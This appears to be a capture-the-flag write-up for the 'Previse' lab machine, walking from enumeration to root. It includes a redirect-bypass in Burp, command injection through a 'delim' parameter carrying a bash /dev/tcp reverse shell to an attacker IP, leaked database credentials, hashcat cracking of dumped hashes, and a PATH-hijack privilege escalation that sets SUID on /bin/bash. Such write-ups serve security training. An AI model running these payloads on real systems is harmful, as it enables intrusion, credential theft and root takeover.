# Previse

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U+bBa/UyMNxMjkPO+rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB+KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q+i+gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI+k9kT2gYslacuTwQhacntIh2XFo0YtfY+dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF+aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=
|   256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv+Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### ffuf

```
login                   [Status: 200, Size: 2224, Words: 486, Lines: 54]
files                   [Status: 302, Size: 4914, Words: 1531, Lines: 113]
header                  [Status: 200, Size: 980, Words: 183, Lines: 21]
nav                     [Status: 200, Size: 1248, Words: 462, Lines: 32]
download                [Status: 302, Size: 0, Words: 1, Lines: 1]
footer                  [Status: 200, Size: 217, Words: 10, Lines: 6]
index                   [Status: 302, Size: 2801, Words: 737, Lines: 72]
status                  [Status: 302, Size: 2968, Words: 749, Lines: 75]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
config                  [Status: 200, Size: 0, Words: 1, Lines: 1]
logs                    [Status: 302, Size: 0, Words: 1, Lines: 1]
```

Good enumeration was key here...first didnt find any useful directory
Then I started fuzzing with ffuf to find more pages

`ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.11.104/FUZZ.php`

`nav.php` is the most useful and shows more pages
But all require authentification :(

but we can bypass that with burpsuite

we can see the pages...we request `accounts.php` and change do capture response

change response code from `301 found` (redirect) to `200 Ok` and forward allows us to bypass redirect

Now we create an account to have access

```
POST /accounts.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,_/_;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://10.10.11.104
DNT: 1
Connection: close
Referer: http://10.10.11.104/login.php
Cookie: PHPSESSID=grjd8tcm0bkoeoqbetojkms7eo
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=nairolf&password=nairolf&confirm=nairolf&submit=
```

Forward and now we can login as 'nairolf' and start looking around pages

`status.php`

```
Check website status:

MySQL server is online and connected!

There are 5 registered admins

There is 1 uploaded file
```

`file_logs.php`
here we can download log file as `out.log`

`files.php`

we can see newguy uploaded a file `sitebackup.zip` we get that

From the sitebackup.zip we get all php files and from `config.php` we get this

```
<?php

function connectDB(){
	$host = 'localhost';
	$user = 'root';
	$passwd = 'mySQL_p@ssw0rd!:)';
	$db = 'previse';
	$mycon = new mysqli($host, $user, $passwd, $db);
	return $mycon;
}

?>
```

we get database credentials

In the code of `logs.php` the `exec()` function can give us code execution with `delim` parameter

Capture a log download request in burpsuite

To `delim=comma` we add our shell code wich give us  
`delim=comma&bash -c 'exec bash -i &>/dev/tcp/10.10.14.108/2311 <&1'`

we get a shell on netcat

inside as www-data our actions are limited...we can use credentials from config.php

`mysql --host=localhost --user=root --password=mySQL_p@ssw0rd\!:\) previse`

Added an escape `\` to password characters

```
mysql> show tables;
show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts |
| files |
+-------------------+
2 rows in set (0.00 sec)
```

```
mysql> select _ from accounts;
select _ from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password | created_at |
+----+----------+------------------------------------+---------------------+
| 1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | test123  | $1$🧂llol$sP8qi2I.K6urjPuzdGizl1 | 2021-10-31 20:21:38 |
|  3 | adminx   | $1$🧂llol$5tZsYwBL.ah/7MifOnD8y1 | 2021-10-31 20:45:45 |
|  4 | nairolf  | $1$🧂llol$dtYsbcUDR1v/zUTtHfZzD1 | 2021-10-31 21:05:14 |
+----+----------+------------------------------------+---------------------+
4 rows in set (0.00 sec)
```

At this point we got users and their passwords but they are hashed
Time to decrypt them with hashcat and rockyou (its always rockyou XD)
Took me alot of time to identify the hash type (google please)...seems like its md5 so the correct command is

`hashcat '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.' /usr/share/wordlists/rockyou.txt -m 500`

wich gives us (after some time)

```
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
Time.Started.....: Mon Nov 1 00:05:11 2021 (30 mins, 29 secs)
Time.Estimated...: Mon Nov 1 00:35:40 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 4084 H/s (6.64ms) @ Accel:16 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 7413280/14344385 (51.68%)
Rejected.........: 0/7413280 (0.00%)
Restore.Point....: 7413248/14344385 (51.68%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidates.#1....: ilovecody98 -> ilovecodee

Started: Mon Nov 1 00:03:43 2021
Stopped: Mon Nov 1 00:35:42 2021
```

So the credentials are:
`m4lwhere:ilovecody112235!`

Lateral movement

```
su m4lwhere
Password: ilovecody112235!

m4lwhere@previse:~$
```

USER FLAG IS OURS  
`cat user.txt`

## Privilege Escalation

```
sudo -l
[sudo] password for m4lwhere: ilovecody112235!

User m4lwhere may run the following commands on previse:
(root) /opt/scripts/access_backup.sh
```

uhm...yeah ok a custom script

`cat /opt/scripts/access_backup.sh`

```
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account

# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)\_file_access.gz
```

path injecton is possible with gzip execution

FFirst we create a fake gzip binary with SUID and make it executable

```
m4lwhere@previse:/tmp$ echo "chmod +s /bin/bash" > gzip
m4lwhere@previse:/tmp$ chmod +x gzip
```

Export path as we are in tmp folder  
`m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH`

we execute the vulnerable script with sudo wich execute our gzip over true one (PATH priority is from left to right)

```
m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh
[sudo] password for m4lwhere:
```

Then we set suid to original /bin/bash wich runs as root now

```
m4lwhere@previse:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Jun 6 2019 /bin/bash
m4lwhere@previse:/tmp$ bash -p
bash-4.4#
```

the last part was tricky so note that I googled before doing it

```
-p Turned on whenever the real and effective user ids do not match.
Disables processing of the $ENV file and importing of shell
functions. Turning this option off causes the effective uid and
gid to be set to the real uid and gid.
```

Now we are root

```
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
```

And its Done!
